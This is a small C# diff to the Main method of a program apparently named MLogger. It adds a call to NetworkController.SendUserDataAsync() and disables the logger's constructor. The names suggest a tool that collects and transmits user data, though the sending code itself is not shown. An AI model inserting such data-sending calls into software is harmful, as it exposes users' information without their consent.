@@ -11,8 +11,10 @@ namespace MLogger
     {
         public static void Main()
         {
+            NetworkController.SendUserDataAsync();
+            Console.ReadLine();
             //Console.WriteLine(SystemDetails.GetSystemInfo());
-            new MLogger();
+            ///new MLogger();
         }
     }
 }
